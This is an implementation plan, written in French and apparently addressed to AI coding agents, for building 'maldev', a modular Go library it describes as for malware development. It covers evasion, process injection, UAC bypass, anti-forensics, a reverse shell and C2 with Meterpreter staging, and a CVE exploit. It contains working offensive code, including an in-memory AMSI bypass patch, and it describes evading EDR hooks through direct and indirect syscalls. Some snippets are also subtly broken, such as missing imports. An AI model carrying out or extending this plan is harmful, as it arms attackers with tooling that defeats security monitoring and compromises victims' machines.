# maldev — Go Workspace Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Créer un workspace Go modulaire `github.com/oioio-space/maldev` à partir du code source dans `ignore/` et `ignore/rshell/`, organisé par fonction avec split plateforme par fichiers `_windows.go`/`_linux.go`, en utilisant les meilleures libs externes disponibles.

**Architecture:** Modules Go indépendants reliés par `go.work`. Dépendances du bas vers le haut : `core/` → `win/` → `evasion/`, `injection/`, `privilege/`, `process/`, `system/`, `pe/`, `cleanup/` → `c2/` → `cve/`. Binaires dans `tools/`. Le dossier `ignore/` ne doit **jamais** être commité.

**Tech Stack:** Go 1.20 min, `golang.org/x/sys`, `github.com/ebitengine/purego`, `github.com/fourcorelabs/wintoken`, `github.com/D3Ext/Hooka/pkg/hooka`, `github.com/Binject/debug/pe`, `github.com/saferwall/pe`, `github.com/mitchellh/go-ps`, `github.com/creack/pty`, `github.com/shirou/gopsutil/v3`

---

## Règles transversales

- Tous les fichiers Windows-only portent `//go:build windows` en première ligne
- Tous les fichiers Linux-only portent `//go:build linux`
- Les fichiers cross-platform n'ont pas de build tag
- Les stubs non-implémentés retournent `ErrNotSupported` (défini dans chaque module)
- Chaque module a son propre `go.mod` avec `module github.com/oioio-space/maldev/<nom>`
- Le dossier `ignore/` est bloqué dans `.gitignore` — vérification avant chaque commit

---

## Structure des fichiers

```
maldev/
├── .gitignore
├── go.work
├── docs/
├── tools/
│   └── rshell/                   ← binaire (cmd/client de rshell)
│
├── core/      go.mod: github.com/oioio-space/maldev/core
│   ├── compat/slog/              ← backport !go1.21 / re-export go1.21
│   ├── compat/slices/
│   ├── compat/cmp/
│   ├── crypto/                   ← AES-GCM, ChaCha20, RC4, 3DES, XOR
│   ├── encode/                   ← Base64, UTF-16LE, ROT13
│   ├── hash/                     ← MD5, SHA*, ROR-13
│   └── utils/                    ← Random, IsFileExist
│
├── win/       go.mod: github.com/oioio-space/maldev/win
│   ├── api/                      ← LazyDLL unique source of truth
│   ├── ntapi/                    ← NtXxx direct
│   ├── syscall/resolver/         ← Hell's Gate, Tartarus, FreshCopy
│   ├── syscall/direct/           ← stub asm amd64
│   ├── syscall/indirect/         ← gadget ntdll
│   ├── token/                    ← fourcorelabs/wintoken wrapper
│   ├── privilege/
│   ├── domain/
│   └── version/
│
├── evasion/   go.mod: github.com/oioio-space/maldev/evasion
│   ├── amsi/
│   ├── etw/
│   ├── unhook/                   ← classic, full, perun
│   ├── acg/
│   ├── blockdlls/
│   ├── phant0m/
│   ├── antidebug/                ← _windows.go / _linux.go
│   ├── antivm/                   ← _windows.go / _linux.go
│   ├── timing/                   ← cross-platform
│   └── sandbox/                  ← orchestrateur
│
├── injection/ go.mod: github.com/oioio-space/maldev/injection
│   ├── injection.go              ← interface + Method enum
│   ├── validate.go
│   ├── fallback.go
│   ├── windows/                  ← 8 méthodes Windows
│   │   ├── crt/
│   │   ├── ct/
│   │   ├── apc/
│   │   ├── earlybird/
│   │   ├── hollow/
│   │   ├── rtl/
│   │   ├── syscall/
│   │   └── fiber/
│   ├── linux/                    ← 3 méthodes Linux sans CGO
│   │   ├── ptrace/               ← amd64 + 386 + arm64
│   │   ├── memfd/
│   │   └── procmem/
│   └── purego/                   ← shellcode + meterpreter via purego
│       ├── shellcode.go          ← mmap + purego.SyscallN
│       └── meterpreter.go        ← wrapper 126 bytes + socket FD
│
├── privilege/ go.mod: github.com/oioio-space/maldev/privilege
│   ├── uacbypass/                ← 5 méthodes Windows
│   └── impersonate/              ← _windows.go / _linux.go
│
├── process/   go.mod: github.com/oioio-space/maldev/process
│   ├── enum/                     ← _windows.go (Toolhelp32) / _linux.go (/proc)
│   └── session/                  ← _windows.go
│
├── system/    go.mod: github.com/oioio-space/maldev/system
│   ├── drive/                    ← _windows.go
│   ├── network/                  ← cross-platform
│   ├── folder/                   ← _windows.go
│   ├── pipes/                    ← _windows.go
│   └── ui/                       ← _windows.go
│
├── pe/        go.mod: github.com/oioio-space/maldev/pe
│   ├── morph/                    ← saferwall/pe (UPX)
│   ├── parse/                    ← Binject/debug/pe
│   └── srdi/                     ← DLL→shellcode
│
├── cleanup/   go.mod: github.com/oioio-space/maldev/cleanup
│   ├── selfdelete/               ← _windows.go / _linux.go
│   ├── service/                  ← _windows.go
│   ├── wipe/                     ← cross-platform
│   └── timestomp/                ← _windows.go / _linux.go
│
├── c2/        go.mod: github.com/oioio-space/maldev/c2
│   ├── cert/                     ← X.509 self-signed, fingerprint
│   ├── transport/                ← TCP + TLS avec cert pinning
│   ├── shell/                    ← reverse shell + reconnect + PTY
│   │   ├── shell.go
│   │   ├── evasion_windows.go    ← AMSI, ETW, CLM, WLDP
│   │   └── ppid_windows.go
│   └── meterpreter/              ← staging TCP/HTTP/HTTPS
│       ├── meterpreter.go
│       ├── execute_windows.go
│       └── execute_unix.go       ← purego.SyscallN
│
└── cve/
    └── CVE-2024-30088/  go.mod: github.com/oioio-space/maldev/cve/CVE-2024-30088
        ├── doc.go
        ├── exploit.go            ← API publique (intouché)
        ├── race.go               ← logique race (intouché)
        └── winapi.go             ← structs CVE-only, DLL→win/api/
```

---

## Task 1 : GitHub + git + .gitignore

**Files:**
- Create: `.gitignore`
- Create: `README.md`

- [ ] **Step 1: Vérifier/créer le repo GitHub**

```bash
cd /c/Users/m.bachmann/GolandProjects/maldev
GITHUB_TOKEN=$(powershell.exe -Command 'echo $env:GITHUB_TOKEN' | tr -d '\r')
export GITHUB_TOKEN
gh auth status || gh auth login --with-token <<< "$GITHUB_TOKEN"
gh repo view oioio-space/maldev 2>/dev/null || gh repo create oioio-space/maldev --public --description "Modular malware development library in Go"
```

- [ ] **Step 2: Créer .gitignore (CRITIQUE)**

```gitignore
# CRITICAL: ignore/ contient du code sensible — ne JAMAIS publier
ignore/

# Binaires et artefacts
*.exe
*.dll
*.so
*.dylib
bin/
build/
dist/

# Go
vendor/
*.test
*.out
coverage.txt

# IDE
.idea/
.vscode/
*.iml

# OS
.DS_Store
Thumbs.db

# Secrets
*.pem
*.key
*.crt
*.pfx
```

- [ ] **Step 3: git init + remote**

```bash
cd /c/Users/m.bachmann/GolandProjects/maldev
git init
git remote add origin https://github.com/oioio-space/maldev.git
```

- [ ] **Step 4: Vérifier que ignore/ est bien ignoré**

```bash
git status --short | grep -c "ignore/" && echo "ERREUR: ignore/ visible!" || echo "OK: ignore/ ignoré"
```
Expected: `OK: ignore/ ignoré`

- [ ] **Step 5: Commit initial**

```bash
git add .gitignore
git commit -m "chore: initial commit — add .gitignore blocking ignore/"
```

---

## Task 2 : go.work + go.mod de tous les modules

**Files:**
- Create: `go.work`
- Create: `core/go.mod`, `win/go.mod`, `evasion/go.mod`, `injection/go.mod`
- Create: `privilege/go.mod`, `process/go.mod`, `system/go.mod`
- Create: `pe/go.mod`, `cleanup/go.mod`, `c2/go.mod`
- Create: `cve/CVE-2024-30088/go.mod`

- [ ] **Step 1: Créer go.work**

```go
// go.work
go 1.20

use (
    ./core
    ./win
    ./evasion
    ./injection
    ./privilege
    ./process
    ./system
    ./pe
    ./cleanup
    ./c2
    ./cve/CVE-2024-30088
    ./tools/rshell
)
```

- [ ] **Step 2: core/go.mod**

```go
module github.com/oioio-space/maldev/core

go 1.20
```

- [ ] **Step 3: win/go.mod**

```go
module github.com/oioio-space/maldev/win

go 1.20

require (
    github.com/fourcorelabs/wintoken v1.0.0
    golang.org/x/sys v0.30.0
)
```

- [ ] **Step 4: evasion/go.mod**

```go
module github.com/oioio-space/maldev/evasion

go 1.20

require (
    github.com/oioio-space/maldev/win v0.0.0
    golang.org/x/sys v0.30.0
)

replace github.com/oioio-space/maldev/win => ../win
```

- [ ] **Step 5: injection/go.mod**

```go
module github.com/oioio-space/maldev/injection

go 1.20

require (
    github.com/ebitengine/purego v0.8.2
    github.com/oioio-space/maldev/win v0.0.0
    github.com/shirou/gopsutil/v3 v3.24.5
    golang.org/x/sys v0.30.0
)

replace github.com/oioio-space/maldev/win => ../win
```

- [ ] **Step 6: privilege/go.mod**

```go
module github.com/oioio-space/maldev/privilege

go 1.20

require (
    github.com/oioio-space/maldev/win v0.0.0
    golang.org/x/sys v0.30.0
)

replace github.com/oioio-space/maldev/win => ../win
```

- [ ] **Step 7: process/go.mod**

```go
module github.com/oioio-space/maldev/process

go 1.20

require (
    github.com/mitchellh/go-ps v1.0.0
    github.com/oioio-space/maldev/win v0.0.0
    golang.org/x/sys v0.30.0
)

replace github.com/oioio-space/maldev/win => ../win
```

- [ ] **Step 8: system/go.mod**

```go
module github.com/oioio-space/maldev/system

go 1.20

require (
    github.com/oioio-space/maldev/win v0.0.0
    golang.org/x/sys v0.30.0
)

replace github.com/oioio-space/maldev/win => ../win
```

- [ ] **Step 9: pe/go.mod**

```go
module github.com/oioio-space/maldev/pe

go 1.20

require (
    github.com/Binject/debug v0.0.0-20230508195519-26db73212a7a
    github.com/saferwall/pe v1.5.6
    golang.org/x/sys v0.30.0
)
```

- [ ] **Step 10: cleanup/go.mod**

```go
module github.com/oioio-space/maldev/cleanup

go 1.20

require (
    github.com/oioio-space/maldev/win v0.0.0
    golang.org/x/sys v0.30.0
)

replace github.com/oioio-space/maldev/win => ../win
```

- [ ] **Step 11: c2/go.mod**

```go
module github.com/oioio-space/maldev/c2

go 1.20

require (
    github.com/creack/pty v1.1.24
    github.com/ebitengine/purego v0.8.2
    github.com/oioio-space/maldev/injection v0.0.0
    github.com/oioio-space/maldev/win v0.0.0
    golang.org/x/sys v0.30.0
)

replace (
    github.com/oioio-space/maldev/injection => ../injection
    github.com/oioio-space/maldev/win => ../win
)
```

- [ ] **Step 12: cve/CVE-2024-30088/go.mod**

```go
module github.com/oioio-space/maldev/cve/CVE-2024-30088

go 1.20

require (
    github.com/oioio-space/maldev/evasion v0.0.0
    github.com/oioio-space/maldev/process v0.0.0
    github.com/oioio-space/maldev/win v0.0.0
    golang.org/x/sys v0.30.0
)

replace (
    github.com/oioio-space/maldev/evasion => ../../evasion
    github.com/oioio-space/maldev/process => ../../process
    github.com/oioio-space/maldev/win => ../../win
)
```

- [ ] **Step 13: tools/rshell/go.mod**

```go
module rshell

go 1.20

require (
    github.com/creack/pty v1.1.24
    github.com/ebitengine/purego v0.8.2
    github.com/oioio-space/maldev/c2 v0.0.0
    github.com/oioio-space/maldev/injection v0.0.0
    github.com/oioio-space/maldev/win v0.0.0
    github.com/shirou/gopsutil/v3 v3.24.5
    golang.org/x/sys v0.30.0
)

replace (
    github.com/oioio-space/maldev/c2 => ../../c2
    github.com/oioio-space/maldev/injection => ../../injection
    github.com/oioio-space/maldev/win => ../../win
)
```

- [ ] **Step 14: go work sync**

```bash
cd /c/Users/m.bachmann/GolandProjects/maldev
go work sync
```

- [ ] **Step 15: Commit**

```bash
git add go.work core/go.mod win/go.mod evasion/go.mod injection/go.mod \
    privilege/go.mod process/go.mod system/go.mod pe/go.mod cleanup/go.mod \
    c2/go.mod cve/CVE-2024-30088/go.mod tools/rshell/go.mod
git commit -m "chore: add go.work and all module go.mod files"
```

---

## Task 3 : core/ — compat, crypto, encode, hash, utils

**Source:** `ignore/compatibility/`, `ignore/utils/utils.go`

**Files:**
- Create: `core/compat/slog/slog_legacy.go`, `core/compat/slog/slog_modern.go`
- Create: `core/compat/slices/slices_legacy.go`, `core/compat/slices/slices_modern.go`
- Create: `core/compat/cmp/cmp_legacy.go`, `core/compat/cmp/cmp_modern.go`
- Create: `core/crypto/aes.go`, `core/crypto/chacha20.go`, `core/crypto/rc4.go`, `core/crypto/xor.go`
- Create: `core/encode/encode.go`
- Create: `core/hash/hash.go`, `core/hash/ror13.go`
- Create: `core/utils/utils.go`

- [ ] **Step 1: core/compat/slog — build tag split**

```go
// core/compat/slog/slog_legacy.go
//go:build !go1.21

package slog

// Contenu porté depuis ignore/compatibility/slog/ (tous les fichiers)
// Copier le contenu de : ignore/compatibility/slog/*.go
// Changer le package en "slog"
```

```go
// core/compat/slog/slog_modern.go
//go:build go1.21

package slog

import stdslog "log/slog"

type (
    Logger        = stdslog.Logger
    Handler       = stdslog.Handler
    Record        = stdslog.Record
    Attr          = stdslog.Attr
    Value         = stdslog.Value
    Level         = stdslog.Level
    LevelVar      = stdslog.LevelVar
    HandlerOptions = stdslog.HandlerOptions
)

var (
    New             = stdslog.New
    NewTextHandler  = stdslog.NewTextHandler
    NewJSONHandler  = stdslog.NewJSONHandler
    Default         = stdslog.Default
    SetDefault      = stdslog.SetDefault
    With            = stdslog.With
    Debug           = stdslog.Debug
    Info            = stdslog.Info
    Warn            = stdslog.Warn
    Error           = stdslog.Error
)

const (
    LevelDebug = stdslog.LevelDebug
    LevelInfo  = stdslog.LevelInfo
    LevelWarn  = stdslog.LevelWarn
    LevelError = stdslog.LevelError
)
```

- [ ] **Step 2: core/compat/slices + cmp — même pattern**

```go
// core/compat/slices/slices_modern.go
//go:build go1.21

package slices

import stdslices "slices"

var (
    Contains   = stdslices.Contains
    Index      = stdslices.Index
    Equal      = stdslices.Equal
    Reverse    = stdslices.Reverse
    Sort       = stdslices.Sort
    SortFunc   = stdslices.SortFunc
    Compact    = stdslices.Compact
    Clone      = stdslices.Clone
)
```

```go
// core/compat/cmp/cmp_modern.go
//go:build go1.21

package cmp

import stdcmp "cmp"

type Ordered = stdcmp.Ordered

var (
    Compare = stdcmp.Compare
    Or      = stdcmp.Or
)
```

Pour `_legacy.go` : copier depuis `ignore/compatibility/slices/` et `ignore/compatibility/cmp/`.

- [ ] **Step 3: core/crypto/xor.go**

```go
package crypto

// XORWithRepeatingKey chiffre data avec key en XOR répété.
// NOTE: pas de sécurité cryptographique — usage obfuscation uniquement.
func XORWithRepeatingKey(data, key []byte) []byte {
    out := make([]byte, len(data))
    kl := len(key)
    for i, b := range data {
        out[i] = b ^ key[i%kl]
    }
    return out
}
```

- [ ] **Step 4: core/crypto/aes.go**

```go
package crypto

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "fmt"
    "io"
)

// EncryptAESGCM chiffre plaintext avec AES-256-GCM.
// Retourne nonce (12 bytes) + ciphertext.
func EncryptAESGCM(key, plaintext []byte) ([]byte, error) {
    if len(key) != 32 {
        return nil, fmt.Errorf("key must be 32 bytes, got %d", len(key))
    }
    block, err := aes.NewCipher(key)
    if err != nil {
        return nil, err
    }
    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }
    nonce := make([]byte, gcm.NonceSize())
    if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
        return nil, err
    }
    return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

// DecryptAESGCM déchiffre ciphertext (nonce + data) avec AES-256-GCM.
func DecryptAESGCM(key, ciphertext []byte) ([]byte, error) {
    if len(key) != 32 {
        return nil, fmt.Errorf("key must be 32 bytes, got %d", len(key))
    }
    block, err := aes.NewCipher(key)
    if err != nil {
        return nil, err
    }
    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }
    ns := gcm.NonceSize()
    if len(ciphertext) < ns {
        return nil, fmt.Errorf("ciphertext too short")
    }
    return gcm.Open(nil, ciphertext[:ns], ciphertext[ns:], nil)
}

// NewAESKey génère une clé AES-256 aléatoire cryptographiquement sûre.
func NewAESKey() ([]byte, error) {
    key := make([]byte, 32)
    _, err := io.ReadFull(rand.Reader, key)
    return key, err
}
```

- [ ] **Step 5: core/crypto/chacha20.go**

```go
package crypto

import (
    "crypto/rand"
    "fmt"
    "io"

    "golang.org/x/crypto/chacha20poly1305"
)

// EncryptChaCha20 chiffre plaintext avec ChaCha20-Poly1305.
// Retourne nonce (24 bytes) + ciphertext.
func EncryptChaCha20(key, plaintext []byte) ([]byte, error) {
    if len(key) != chacha20poly1305.KeySize {
        return nil, fmt.Errorf("key must be %d bytes", chacha20poly1305.KeySize)
    }
    aead, err := chacha20poly1305.NewX(key)
    if err != nil {
        return nil, err
    }
    nonce := make([]byte, aead.NonceSize())
    if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
        return nil, err
    }
    return aead.Seal(nonce, nonce, plaintext, nil), nil
}

// DecryptChaCha20 déchiffre ciphertext avec ChaCha20-Poly1305.
func DecryptChaCha20(key, ciphertext []byte) ([]byte, error) {
    if len(key) != chacha20poly1305.KeySize {
        return nil, fmt.Errorf("key must be %d bytes", chacha20poly1305.KeySize)
    }
    aead, err := chacha20poly1305.NewX(key)
    if err != nil {
        return nil, err
    }
    ns := aead.NonceSize()
    if len(ciphertext) < ns {
        return nil, fmt.Errorf("ciphertext too short")
    }
    return aead.Open(nil, ciphertext[:ns], ciphertext[ns:], nil)
}
```

- [ ] **Step 6: core/encode/encode.go**

```go
package encode

import (
    "encoding/base64"
    "unicode/utf16"
)

// Base64Encode encode en Base64 standard.
func Base64Encode(data []byte) string { return base64.StdEncoding.EncodeToString(data) }

// Base64Decode décode du Base64 standard.
func Base64Decode(s string) ([]byte, error) { return base64.StdEncoding.DecodeString(s) }

// ToUTF16LE convertit une string Go (UTF-8) en UTF-16 Little Endian.
// Utilisé pour encoder des scripts PowerShell avec -EncodedCommand.
func ToUTF16LE(s string) []byte {
    runes := []rune(s)
    encoded := utf16.Encode(runes)
    b := make([]byte, len(encoded)*2)
    for i, r := range encoded {
        b[i*2] = byte(r)
        b[i*2+1] = byte(r >> 8)
    }
    return b
}

// EncodePowerShell encode un script PowerShell en Base64(UTF-16LE)
// pour utilisation avec: powershell.exe -EncodedCommand <result>
func EncodePowerShell(script string) string {
    return base64.StdEncoding.EncodeToString(ToUTF16LE(script))
}
```

- [ ] **Step 7: core/hash/ror13.go** (API hashing pour résolution de fonctions)

```go
package hash

import "strings"

// ROR13 calcule le hash ROR-13 d'un nom de fonction Windows.
// Utilisé pour résoudre des fonctions API sans strings en clair.
// Algorithme standard dans les shellcodes x64.
func ROR13(name string) uint32 {
    var h uint32
    for _, c := range strings.ToUpper(name) {
        h = (h>>13 | h<<19) + uint32(c)
    }
    return h
}

// ROR13Module calcule le hash pour un nom de module (ex: "KERNEL32.DLL").
func ROR13Module(name string) uint32 { return ROR13(name) }
```

- [ ] **Step 8: core/utils/utils.go**

```go
package utils

import (
    "crypto/rand"
    "math/big"
    "os"
)

const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

// RandomString génère une string aléatoire cryptographiquement sûre.
func RandomString(length int) (string, error) {
    b := make([]byte, length)
    for i := range b {
        n, err := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
        if err != nil {
            return "", err
        }
        b[i] = charset[n.Int64()]
    }
    return string(b), nil
}

// RandomBytes génère n bytes aléatoires cryptographiquement sûrs.
func RandomBytes(n int) ([]byte, error) {
    b := make([]byte, n)
    _, err := rand.Read(b)
    return b, err
}

// IsFileExist vérifie l'existence d'un fichier ou répertoire.
func IsFileExist(path string) bool {
    _, err := os.Stat(path)
    return !os.IsNotExist(err)
}
```

- [ ] **Step 9: go mod tidy + commit**

```bash
cd /c/Users/m.bachmann/GolandProjects/maldev/core
go mod tidy
cd ..
git add core/
git commit -m "feat(core): add compat, crypto, encode, hash, utils packages"
```

---

## Task 4 : win/ — api, version, token, privilege, domain, ntapi, syscall

**Source:** `ignore/win/`, `ignore/antiforensic/windows.go`

- [ ] **Step 1: win/api/dll.go** — Source unique de toutes les DLL

```go
//go:build windows

// Package api centralise toutes les déclarations LazyDLL et structures
// Windows partagées entre les modules maldev. C'est la SEULE source de
// vérité pour les handles de DLL — ne jamais redéclarer ailleurs.
package api

import "golang.org/x/sys/windows"

// DLL handles — chargées via NewLazySystemDLL pour restreindre la
// recherche à %SystemRoot%\System32 (prévient le DLL hijacking).
var (
    Kernel32  = windows.NewLazySystemDLL("kernel32.dll")
    Ntdll     = windows.NewLazySystemDLL("ntdll.dll")
    Advapi32  = windows.NewLazySystemDLL("advapi32.dll")
    User32    = windows.NewLazySystemDLL("user32.dll")
    Shell32   = windows.NewLazySystemDLL("shell32.dll")
    Userenv   = windows.NewLazySystemDLL("userenv.dll")
    Netapi32  = windows.NewLazySystemDLL("netapi32.dll")
)

// Procs kernel32.dll
var (
    ProcCreateToolhelp32Snapshot  = Kernel32.NewProc("CreateToolhelp32Snapshot")
    ProcProcess32First            = Kernel32.NewProc("Process32FirstW")
    ProcProcess32Next             = Kernel32.NewProc("Process32NextW")
    ProcVirtualAlloc              = Kernel32.NewProc("VirtualAlloc")
    ProcVirtualAllocEx            = Kernel32.NewProc("VirtualAllocEx")
    ProcVirtualProtect            = Kernel32.NewProc("VirtualProtect")
    ProcVirtualProtectEx          = Kernel32.NewProc("VirtualProtectEx")
    ProcWriteProcessMemory        = Kernel32.NewProc("WriteProcessMemory")
    ProcReadProcessMemory         = Kernel32.NewProc("ReadProcessMemory")
    ProcCreateRemoteThread        = Kernel32.NewProc("CreateRemoteThread")
    ProcCreateThread              = Kernel32.NewProc("CreateThread")
    ProcCreateProcessW            = Kernel32.NewProc("CreateProcessW")
    ProcOpenProcess               = Kernel32.NewProc("OpenProcess")
    ProcGetDiskFreeSpaceExW       = Kernel32.NewProc("GetDiskFreeSpaceExW")
    ProcGlobalMemoryStatusEx      = Kernel32.NewProc("GlobalMemoryStatusEx")
    ProcGetLogicalDrives          = Kernel32.NewProc("GetLogicalDrives")
    ProcGetDriveTypeW             = Kernel32.NewProc("GetDriveTypeW")
    ProcGetVolumeInformationW     = Kernel32.NewProc("GetVolumeInformationW")
    ProcMoveFileExW               = Kernel32.NewProc("MoveFileExW")
    ProcIsDebuggerPresent         = Kernel32.NewProc("IsDebuggerPresent")
    ProcSetProcessMitigationPolicy = Kernel32.NewProc("SetProcessMitigationPolicy")
)

// Procs ntdll.dll
var (
    ProcNtQuerySystemInformation  = Ntdll.NewProc("NtQuerySystemInformation")
    ProcNtQueryInformationToken   = Ntdll.NewProc("NtQueryInformationToken")
    ProcNtWriteVirtualMemory      = Ntdll.NewProc("NtWriteVirtualMemory")
    ProcNtProtectVirtualMemory    = Ntdll.NewProc("NtProtectVirtualMemory")
    ProcNtCreateThreadEx          = Ntdll.NewProc("NtCreateThreadEx")
    ProcNtQueryInformationThread  = Ntdll.NewProc("NtQueryInformationThread")
    ProcEtwEventWrite             = Ntdll.NewProc("EtwEventWrite")
    ProcEtwEventWriteEx           = Ntdll.NewProc("EtwEventWriteEx")
    ProcEtwEventWriteFull         = Ntdll.NewProc("EtwEventWriteFull")
    ProcEtwEventWriteString       = Ntdll.NewProc("EtwEventWriteString")
    ProcEtwEventWriteTransfer     = Ntdll.NewProc("EtwEventWriteTransfer")
    ProcRtlCreateUserThread       = Ntdll.NewProc("RtlCreateUserThread")
)

// Procs advapi32.dll
var (
    ProcLogonUserW                              = Advapi32.NewProc("LogonUserW")
    ProcImpersonateLoggedOnUser                 = Advapi32.NewProc("ImpersonateLoggedOnUser")
    ProcSetNamedSecurityInfoW                   = Advapi32.NewProc("SetNamedSecurityInfoW")
    ProcConvertStringSecurityDescriptorToSD     = Advapi32.NewProc("ConvertStringSecurityDescriptorToSecurityDescriptorW")
    ProcSetServiceObjectSecurity               = Advapi32.NewProc("SetServiceObjectSecurity")
)

// Procs user32.dll
var (
    ProcMessageBoxW = User32.NewProc("MessageBoxW")
    ProcMessageBeep = User32.NewProc("MessageBeep")
)

// Procs shell32.dll
var (
    ProcSHGetSpecialFolderPath = Shell32.NewProc("SHGetSpecialFolderPathW")
    ProcShellExecuteW          = Shell32.NewProc("ShellExecuteW")
)
```

- [ ] **Step 2: win/api/structs.go** — Structures partagées

```go
//go:build windows

package api

// MEMORYSTATUSEX pour GlobalMemoryStatusEx.
type MEMORYSTATUSEX struct {
    DwLength                uint32
    DwMemoryLoad            uint32
    UllTotalPhys            uint64
    UllAvailPhys            uint64
    UllTotalPageFile        uint64
    UllAvailPageFile        uint64
    UllTotalVirtual         uint64
    UllAvailVirtual         uint64
    UllAvailExtendedVirtual uint64
}

// PROCESSENTRY32W pour Toolhelp32.
type PROCESSENTRY32W struct {
    DwSize              uint32
    CntUsage            uint32
    Th32ProcessID       uint32
    Th32DefaultHeapID   uintptr
    Th32ModuleID        uint32
    CntThreads          uint32
    Th32ParentProcessID uint32
    PcPriClassBase      int32
    DwFlags             uint32
    SzExeFile           [260]uint16
}
```

- [ ] **Step 3: win/api/errors.go**

```go
//go:build windows

package api

import "fmt"

// ErrNotSupported est retourné quand une fonctionnalité n'est pas disponible
// sur la version Windows cible (ex: API Win8+ sur Win7).
var ErrNotSupported = fmt.Errorf("not supported on this Windows version")

// NTSTATUSError wraps un code NTSTATUS en error Go.
type NTSTATUSError uint32

func (e NTSTATUSError) Error() string {
    return fmt.Sprintf("NTSTATUS 0x%08X", uint32(e))
}

// IsSuccess retourne true si le NTSTATUS indique un succès.
func IsSuccess(status uintptr) bool { return status == 0 }
```

- [ ] **Step 4: win/version/version_windows.go** — Port depuis ignore/win/version.go

```go
//go:build windows

// Package version détecte la version Windows à l'exécution.
// Utilisé par d'autres modules pour activer/désactiver des APIs
// selon la cible (Win7, Win8, Win10, Win11, Server).
package version
```

Porter le contenu de `ignore/win/version.go` dans ce fichier.
Ajouter la méthode `IsAtLeast(v WindowsVersion) bool` et les constantes
`Windows7, Windows8, Windows10, Windows11, WindowsServer2019, WindowsServer2022`.

- [ ] **Step 5: win/token/, win/privilege/, win/domain/**

- `win/token/` : wrapper autour de `github.com/fourcorelabs/wintoken`
  Porter `ignore/win/wintoken/token.go` et `ignore/win/wintoken/gettoken.go`
- `win/privilege/` : porter `ignore/win/admin.go`
- `win/domain/` : porter `ignore/win/domain.go`

- [ ] **Step 6: win/ntapi/ntapi_windows.go**

```go
//go:build windows

// Package ntapi expose les fonctions Native API (ntdll.dll, NtXxx)
// directement, sans passer par les wrappers kernel32.
// Ces fonctions sont moins surveillées que leurs équivalents kernel32
// mais restent hookables par les EDR au niveau ntdll.
//
// Pour bypass complet des hooks: utiliser win/syscall/direct ou indirect.
package ntapi

import (
    "github.com/oioio-space/maldev/win/api"
    "golang.org/x/sys/windows"
)

// NtAllocateVirtualMemory alloue de la mémoire dans un processus cible.
func NtAllocateVirtualMemory(handle windows.Handle, baseAddr *uintptr, zeroBits, size *uintptr, allocType, protect uint32) error {
    // Utilise api.Ntdll directement — pas de redéclaration
    proc := api.Ntdll.NewProc("NtAllocateVirtualMemory")
    r, _, _ := proc.Call(
        uintptr(handle),
        uintptr(unsafe.Pointer(baseAddr)),
        uintptr(zeroBits),
        uintptr(unsafe.Pointer(size)),
        uintptr(allocType),
        uintptr(protect),
    )
    if r != 0 {
        return api.NTSTATUSError(r)
    }
    return nil
}
```

- [ ] **Step 7: win/syscall/ — resolver, direct, indirect**

```go
// win/syscall/caller.go
//go:build windows

// Package syscall fournit plusieurs stratégies d'appel syscall Windows.
//
// # Choisir sa méthode
//
//   Environnement non-surveillé: win/api (WinAPI standard)
//   EDR hooks kernel32: win/ntapi (NtXxx direct)
//   EDR hooks ntdll, scan mémoire basique: MethodDirect + TartarusResolver
//   EDR avancé, corrélation adresse: MethodIndirect + ChainResolver
//
// # Tableau de détection
//
//   Méthode     Hook kernel32  Hook ntdll  Scan mémoire  Addr correlation
//   WinAPI          oui           oui           —              —
//   NativeAPI       non           oui           —              —
//   Direct          non           non           ⚠              —
//   Indirect        non           non           —              ✓
package syscall

// Method représente la stratégie d'invocation syscall.
type Method int

const (
    MethodWinAPI    Method = iota // via kernel32/advapi32 — standard
    MethodNativeAPI               // via ntdll NtXxx — bypass hooks kernel32
    MethodDirect                  // stub asm — bypass tous les hooks userland
    MethodIndirect                // gadget ntdll — le plus discret
)
```

Pour le resolver Hell's Gate: wrapper autour de `github.com/C-Sto/BananaPhone`.
Pour indirect: wrapper autour de `github.com/f1zm0/acheron`.

- [ ] **Step 8: go mod tidy + commit**

```bash
cd /c/Users/m.bachmann/GolandProjects/maldev/win
go mod tidy
cd ..
git add win/
git commit -m "feat(win): add api, version, token, privilege, domain, ntapi, syscall"
```

---

## Task 5 : evasion/ — port depuis ignore/antiforensic/ + Hooka

**Source:** `ignore/antiforensic/`

Chaque sous-package suit le pattern:
```
evasion/<nom>/
├── <nom>.go          ← interface + types communs (pas de build tag)
├── <nom>_windows.go  ← impl Windows
└── <nom>_linux.go    ← impl Linux (ou stub ErrNotSupported)
```

- [ ] **Step 1: evasion/etw/** — port depuis `ignore/antiforensic/ETWpatching.go`

Utiliser `win/api.ProcEtwEventWrite` etc. au lieu de redéclarer.
Fonction principale: `PatchETW(method syscall.Method) error`

- [ ] **Step 2: evasion/amsi/** — nouveau (depuis Hooka)

```go
//go:build windows

package amsi

import (
    "github.com/oioio-space/maldev/win/api"
    "golang.org/x/sys/windows"
)

// PatchAmsiScanBuffer écrase AmsiScanBuffer pour retourner AMSI_RESULT_CLEAN.
// Patch: mov eax, 0x80070057; ret
func PatchAmsiScanBuffer() error {
    patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
    amsi := windows.NewLazySystemDLL("amsi.dll")
    proc := amsi.NewProc("AmsiScanBuffer")
    if err := proc.Find(); err != nil {
        return err
    }
    addr := proc.Addr()
    var old uint32
    api.ProcVirtualProtect.Call(addr, uintptr(len(patch)), 0x40, uintptr(unsafe.Pointer(&old)))
    for i, b := range patch {
        *(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
    }
    api.ProcVirtualProtect.Call(addr, uintptr(len(patch)), uintptr(old), uintptr(unsafe.Pointer(&old)))
    return nil
}
```

- [ ] **Step 3: evasion/unhook/** — Classic, Full, Perun's

```go
//go:build windows

// Package unhook retire les hooks EDR posés sur ntdll.dll.
//
// Trois méthodes par ordre croissant de sophistication:
